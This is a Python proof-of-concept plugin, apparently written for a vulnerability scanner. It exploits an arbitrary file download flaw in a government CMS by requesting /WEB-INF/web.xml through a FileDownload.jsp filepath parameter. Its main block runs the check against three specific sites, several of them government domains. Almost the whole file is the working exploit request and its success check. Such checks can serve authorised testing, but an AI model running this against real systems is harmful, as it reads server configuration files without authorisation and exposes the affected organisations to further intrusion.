#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:xq17
#Name:政府通用cms任意下载 （据说管理会帮我写特征也）
#Refer:http://www.wooyun.org/bugs/wooyun-2014-068728/

def assign(service,arg):
    
    if service=="zf_cms":
        return True,arg 
    
def  audit(arg):
    url=arg+"cms/upload/FileDownload.jsp?id=020010040000092515&filepath=/WEB-INF/web.xml&downloadName=web.xml"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "<web-app" in res and "<context-param>" in res: 
        security_hole(url)   

if __name__=="__main__":
    from dummy import *
    audit(assign('zf_cms','http://xn.mzgtzy.gov.cn/')[1])
    audit(assign('zf_cms','http://www.mzgtzy.gov.cn/')[1])
    audit(assign('zf_cms','http://www.gdrsgis.org:8720/')[1])